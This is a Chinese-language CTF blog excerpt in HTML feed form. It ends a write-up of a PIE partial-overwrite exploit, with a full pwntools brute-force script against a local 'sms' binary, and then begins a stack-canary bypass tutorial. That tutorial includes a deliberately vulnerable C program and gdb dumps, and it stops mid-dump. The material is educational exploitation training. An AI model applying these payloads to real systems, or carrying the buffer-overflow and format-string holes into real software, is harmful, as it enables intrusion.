title="5：综上"></a>5：综上</h3><p>set_user((<strong>int64)&amp;v1)函数可以对a1（v1)+180地址处进行赋值，使其赋为0xca （202）。这样set_sms((</strong>int64)&amp;v1)函数就可以往a1（v1）地址读入0xca（202） 个字符。这样就可以来控制程序返回地址了。<br>为什么是202个字符，结合上面的PIE地址特点。最后面两个字节（16位）会占用后4个十六进制数（小端序）而不变的是后三个十六进制数，所以我们构造的倒数第四个十六进制数需要多次执行程序碰到刚好符合的地址。不可能放201个字符因为最后一个字节只能控制两个十六进制数。</p><p>因为那个倒数第四个数需要多次执行才可能碰到所以我们要进行循环爆破，但也就0~f这几种情况，爆破次数应该不会很大，可以接受。</p><p>后门的特征地址：</p><pre class=" language-bash"><code class="language-bash">.text:0000000000000900 push    rbp.text:0000000000000901 mov     rbp, rsp.text:0000000000000904 add     rsp, 0FFFFFFFFFFFFFF80h <span class="token punctuation">;</span> Add.text:0000000000000908 mov     rdx, cs:__bss_start <span class="token punctuation">;</span> stream.text:000000000000090F lea     rax, <span class="token punctuation">[</span>rbp+s<span class="token punctuation">]</span>    <span class="token punctuation">;</span> Load Effective Address.text:0000000000000913 mov     esi, 80h        <span class="token punctuation">;</span> n.text:0000000000000918 mov     rdi, rax        <span class="token punctuation">;</span> s.text:000000000000091B call    _fgets          <span class="token punctuation">;</span> Call Procedure.text:0000000000000920 lea     rax, <span class="token punctuation">[</span>rbp+s<span class="token punctuation">]</span>    <span class="token punctuation">;</span> Load Effective Address.text:0000000000000924 mov     rdi, rax        <span class="token punctuation">;</span> <span class="token function">command</span>.text:0000000000000927 call    _system         <span class="token punctuation">;</span> Call Procedure.text:000000000000092C nop                     <span class="token punctuation">;</span> No Operation.text:000000000000092D leave                   <span class="token punctuation">;</span> High Level Procedure Exit.text:000000000000092E retn                    <span class="token punctuation">;</span> Return Near from Pro</code></pre><p><strong>所以200个padding后面 应该如此构造：’\x00’ + ‘\x99’  (小端序倒着存）后面这个x99第一个9就是猜的，随便一个都行。</strong><br>所以主要exp因该是：</p><pre class=" language-python"><code class="language-python">    payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span><span class="token string">'\xca'</span>     sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span> payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">200</span>  <span class="token operator">+</span> <span class="token string">'\x00\x99'</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span></code></pre><p>但是很可惜这是错的！！！为啥？因为你在payload2上放了一个\x00这难道不会被strncpy当作截断符吗？？？<br>所以往后面调一下：\x01\x99</p><h3 id="6：EXP"><a href="#6：EXP" class="headerlink" title="6：EXP"></a>6：EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep    <span class="token comment" spellcheck="true">#引入time模块的sleep函数可以让爆破过程放慢，我们看到清楚一点</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#256，也可以小一点</span>        i <span class="token operator">+=</span> <span class="token number">1</span>                     <span class="token keyword">print</span> i             <span class="token comment" spellcheck="true">#可以显示爆破次数</span>        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./sms'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    <span class="token comment" spellcheck="true">#set_user</span>    payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span><span class="token string">'\xca'</span>    <span class="token comment" spellcheck="true">#set_user((__int64)&amp;v1)函数循环赋值41次最后的'\xca'就是为覆盖返回地址准备的</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#set_sms</span>    payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">200</span>  <span class="token operator">+</span> <span class="token string">'\x01\x99'</span>     <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#sh.sendline("/bin/sh\x00")</span>        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat sms.py\x00'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#这里我直接cat 本地文件了，也可以用/bin/sh，我跟倾向于cat 文件 比较明了。</span>        sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true">#print sh.recv() 这个操作可以多学习</span>        <span class="token comment" spellcheck="true">#sh.interactive()</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span></code></pre><p><img src="https://s1.ax1x.com/2020/07/15/Ua6WCQ.png" alt=""><br>成功！！！</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-canary绕过</title>
      <link href="/2020/07/12/wiki-canary-rao-guo/"/>
      <url>/2020/07/12/wiki-canary-rao-guo/</url>
      
        <content type="html"><![CDATA[<h2 id="1：介绍"><a href="#1：介绍" class="headerlink" title="1：介绍"></a>1：介绍</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。<br>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。<br>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p><h2 id="2：Canary-原理"><a href="#2：Canary-原理" class="headerlink" title="2：Canary 原理"></a>2：Canary 原理</h2><p>在 GCC 中使用 Canary<br>可以在 GCC 中使用以下参数设置 Canary:</p><pre class=" language-bash"><code class="language-bash">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护-fno-stack-protector 禁用保护</code></pre><p>开启 Canary 保护的 stack 结构大概如下：</p><pre><code>        High        Address |                 |                +-----------------+                | args            |                +-----------------+                | return address  |                +-----------------+        rbp =&gt;  | old ebp         |                +-----------------+      rbp-8 =&gt;  | canary value    |                +-----------------+                | local variables |        Low     |                 |        Address</code></pre><p>汇编指令一般如下：</p><pre class=" language-bash"><code class="language-bash">mov     eax, large gs:14h   <span class="token comment" spellcheck="true">#将一个cookie放在eax</span>mov     <span class="token punctuation">[</span>ebp+var_C<span class="token punctuation">]</span>, eax    <span class="token comment" spellcheck="true">#再由eax放入[ebp+var_C]（栈中靠后的位置）</span>··········mov     eax, <span class="token punctuation">[</span>ebp+var_C<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#将其赋值到eax</span>xor     eax, large gs:14h  <span class="token comment" spellcheck="true">#将其与原cookie比较            #影响zf标志寄存器</span>jz      short loc_8048692  <span class="token comment" spellcheck="true">#如果计算结果不为0就跳转（上面的异或操作）</span></code></pre><p>如果栈中的cookie被更改了就会jz跳到call  __stack_chk_fail_local。其也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下：</p><pre class=" language-c"><code class="language-c">eglibc<span class="token number">-2.19</span><span class="token operator">/</span>debug<span class="token operator">/</span>stack_chk_fail<span class="token punctuation">.</span>c<span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>希望我以后能懂这个定义（doge）</code></pre><p>对于 Linux 来说，gs 寄存器实际指向的是当前栈的 TLS 结构，gs:14h 指向的正是 <strong>stack_guard</strong>。 </p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Pointer to the TCB.  Not necessarily the                       thread descriptor used by libpthread.  */</span>  dtv_t <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  uintptr_t sysinfo<span class="token punctuation">;</span>  uintptr_t stack_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> tcbhead_t<span class="token punctuation">;</span></code></pre><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 <strong>security_init</strong> 进行初始化。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">security_init</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span>  <span class="token comment" spellcheck="true">// glibc直接使用了_dl_random的值并没有给赋值</span>  <span class="token comment" spellcheck="true">// 如果不采用这种模式, glibc也可以自己产生随机数</span>  <span class="token comment" spellcheck="true">//将_dl_random的最后一个字节设置为0x0</span>  uintptr_t stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span> <span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 设置Canary的值到TLS中</span>  <span class="token function">THREAD_SET_STACK_GUARD</span> <span class="token punctuation">(</span>stack_chk_guard<span class="token punctuation">)</span><span class="token punctuation">;</span>  _dl_random <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><span class="token macro property">#<span class="token directive keyword">define</span> THREAD_SET_STACK_GUARD(value) \  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></code></pre><p><strong>抓重点：每次开启程序cookie的值随机的</strong></p><h2 id="3：Canary-绕过技术"><a href="#3：Canary-绕过技术" class="headerlink" title="3：Canary 绕过技术"></a>3：Canary 绕过技术</h2><p>注意：Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，<strong>在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求</strong>。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p><strong>Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串（因为它会贴着buf）。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节(\x00,然后就不会被截断)，来打印出剩余的 Canary 部分（前提是得有打印函数）。 这种利用方式需要存在合适的输出函数，并且可能需要第一次溢出泄露 Canary，之后再次溢出控制执行流程。</strong></p><p>例子：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><pre class=" language-bash"><code class="language-bash">$ gcc -m32 -no-pie test.c -o <span class="token function">test</span></code></pre><p>先读程序：输出Hello Hacker!后进入vuln函数，其buf大小为100而可以读入0x200个字符显然存在溢出，还有格式化字符串漏洞。后门getshell。<br>因为插入了cookie，所以我们要想办法得到cookie，找到它在栈中的正确位置构造payload绕过canary</p><h3 id="寻找cookie"><a href="#寻找cookie" class="headerlink" title="寻找cookie"></a>寻找cookie</h3><p>因为cookie插入时汇编代码特征明显，我们多留意其汇编相关的寄存器值即可<br>因为程序默认开启-fstack-protector保护，所以只为局部变量中含有数组的函数插入保护，那我们直接进入vuln函数：</p><pre class=" language-bash"><code class="language-bash">Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> vuln:<span class="token operator">=</span><span class="token operator">></span> 0x0804862b <span class="token operator">&lt;</span>+0<span class="token operator">></span>:    push   ebp   0x0804862c <span class="token operator">&lt;</span>+1<span class="token operator">></span>:    mov    ebp,esp   0x0804862e <span class="token operator">&lt;</span>+3<span class="token operator">></span>:    push   ebx   0x0804862f <span class="token operator">&lt;</span>+4<span class="token operator">></span>:    sub    esp,0x74   0x08048632 <span class="token operator">&lt;</span>+7<span class="token operator">></span>:    call   0x80484e0 <span class="token operator">&lt;</span>__x86.get_pc_thunk.bx<span class="token operator">></span>   0x08048637 <span class="token operator">&lt;</span>+12<span class="token operator">></span>:    add    ebx,0x19c9   0x0804863d <span class="token operator">&lt;</span>+18<span class="token operator">></span>:    mov    eax,gs:0x14     <span class="token comment" spellcheck="true">#插入cookie</span>   0x08048643 <span class="token operator">&lt;</span>+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax   0x08048646 <span class="token operator">&lt;</span>+27<span class="token operator">></span>:    xor    eax,eax   0x08048648 <span class="token operator">&lt;</span>+29<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x0   0x0804864f <span class="token operator">&lt;</span>+36<span class="token operator">></span>:    jmp    0x804867a <span class="token operator">&lt;</span>vuln+79<span class="token operator">></span>   0x08048651 <span class="token operator">&lt;</span>+38<span class="token operator">></span>:    sub    esp,0x4   0x08048654 <span class="token operator">&lt;</span>+41<span class="token operator">></span>:    push   0x200   0x08048659 <span class="token operator">&lt;</span>+46<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x70<span class="token punctuation">]</span>   0x0804865c <span class="token operator">&lt;</span>+49<span class="token operator">></span>:    push   eax   0x0804865d <span class="token operator">&lt;</span>+50<span class="token operator">></span>:    push   0x0   0x0804865f <span class="token operator">&lt;</span>+52<span class="token operator">></span>:    call   0x8048420 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>   0x08048664 <span class="token operator">&lt;</span>+57<span class="token operator">></span>:    add    esp,0x10   0x08048667 <span class="token operator">&lt;</span>+60<span class="token operator">></span>:    sub    esp,0xc   0x0804866a <span class="token operator">&lt;</span>+63<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x70<span class="token punctuation">]</span>   0x0804866d <span class="token operator">&lt;</span>+66<span class="token operator">></span>:    push   eax   0x0804866e <span class="token operator">&lt;</span>+67<span class="token operator">></span>:    call   0x8048430 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>   0x08048673 <span class="token operator">&lt;</span>+72<span class="token operator">></span>:    add    esp,0x10   0x08048676 <span class="token operator">&lt;</span>+75<span class="token operator">></span>:    add    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x1   0x0804867a <span class="token operator">&lt;</span>+79<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x1   0x0804867e <span class="token operator">&lt;</span>+83<span class="token operator">></span>:    jle    0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>   0x08048680 <span class="token operator">&lt;</span>+85<span class="token operator">></span>:    nop   0x08048681 <span class="token operator">&lt;</span>+86<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#校验cookie</span>   0x08048684 <span class="token operator">&lt;</span>+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14   0x0804868b <span class="token operator">&lt;</span>+96<span class="token operator">></span>:    je     0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>   0x0804868d <span class="token operator">&lt;</span>+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x08048692 <span class="token operator">&lt;</span>+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x08048695 <span class="token operator">&lt;</span>+106<span class="token operator">></span>:    leave     0x08048696 <span class="token operator">&lt;</span>+107<span class="token operator">></span>:    ret    End of assembler dump.gdb-peda$ </code></pre><p>我们让程序执行到<strong><em>6：0x08048643 &lt;+24&gt;:    mov    DWORD PTR [ebp-0xc],eax</em></strong>就可以从eax看到cookie的值</p><pre class=" language-bash"><code class="language-bash">EAX: 0x25710300 EBX: 0x804a000 --<span class="token operator">></span> 0x8049f08 --<span class="token operator">></span> 0x1 ECX: 0xf7fb2dc7 --<span class="token operator">></span> 0xfb38900a EDX: 0xf7fb3890 --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd008 --<span class="token operator">></span> 0xffffd018 --<span class="token operator">></span> 0x0 ESP: 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 EIP: 0x8048643 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax<span class="token punctuation">)</span>EFLAGS: 0x216 <span class="token punctuation">(</span>carry PARITY ADJUST zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x8048632 <span class="token operator">&lt;</span>vuln+7<span class="token operator">></span>:    call   0x80484e0 <span class="token operator">&lt;</span>__x86.get_pc_thunk.bx<span class="token operator">></span>   0x8048637 <span class="token operator">&lt;</span>vuln+12<span class="token operator">></span>:    add    ebx,0x19c9   0x804863d <span class="token operator">&lt;</span>vuln+18<span class="token operator">></span>:    mov    eax,gs:0x14<span class="token operator">=</span><span class="token operator">></span> 0x8048643 <span class="token operator">&lt;</span>vuln+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax   0x8048646 <span class="token operator">&lt;</span>vuln+27<span class="token operator">></span>:    xor    eax,eax   0x8048648 <span class="token operator">&lt;</span>vuln+29<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x0   0x804864f <span class="token operator">&lt;</span>vuln+36<span class="token operator">></span>:    jmp    0x804867a <span class="token operator">&lt;</span>vuln+79<span class="token operator">></span>   0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>:    sub    esp,0x4<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 0004<span class="token operator">|</span> 0xffffcf94 --<span class="token operator">></span> 0xf7fb2dc7 --<span class="token operator">></span> 0xfb38900a 0008<span class="token operator">|</span> 0xffffcf98 --<span class="token operator">></span> 0x1 0012<span class="token operator">|</span> 0xffffcf9c --<span class="token operator">></span> 0x1 0016<span class="token operator">|</span> 0xffffcfa0 --<span class="token operator">></span> 0x1 0020<span class="token operator">|</span> 0xffffcfa4 --<span class="token operator">></span> 0x0 0024<span class="token operator">|</span> 0xffffcfa8 --<span class="token operator">></span> 0xf7e4fab9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_IO_file_overflow+9<span class="token operator">></span>:    add    edx,0x162547<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0xf7fb0860 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 3, 0x08048643 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>发现EAX: 0x25710300  cookie，继续到read函数我们使其读入很多字符（200个）让其执行到要进行比较的时候</p><pre class=" language-bash"><code class="language-bash">EAX: 0x41684141 <span class="token punctuation">(</span><span class="token string">'AAhA'</span><span class="token punctuation">)</span>EBX: 0x804a000 --<span class="token operator">></span> 0x8049f08 --<span class="token operator">></span> 0x1 ECX: 0xde EDX: 0xf7fb3890 --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd008 <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>ESP: 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 EIP: 0x8048684 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14<span class="token punctuation">)</span>EFLAGS: 0x202 <span class="token punctuation">(</span>carry parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804867e <span class="token operator">&lt;</span>vuln+83<span class="token operator">></span>:    jle    0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>   0x8048680 <span class="token operator">&lt;</span>vuln+85<span class="token operator">></span>:    nop   0x8048681 <span class="token operator">&lt;</span>vuln+86<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> 0x8048684 <span class="token operator">&lt;</span>vuln+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14   0x804868b <span class="token operator">&lt;</span>vuln+96<span class="token operator">></span>:    je     0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>   0x804868d <span class="token operator">&lt;</span>vuln+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x8048695 <span class="token operator">&lt;</span>vuln+106<span class="token operator">></span>:    leave<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 0004<span class="token operator">|</span> 0xffffcf94 --<span class="token operator">></span> 0x2 0008<span class="token operator">|</span> 0xffffcf98 <span class="token punctuation">(</span><span class="token string">"AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">..</span>.<span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffcf9c <span class="token punctuation">(</span><span class="token string">"AAsAABAA<span class="token 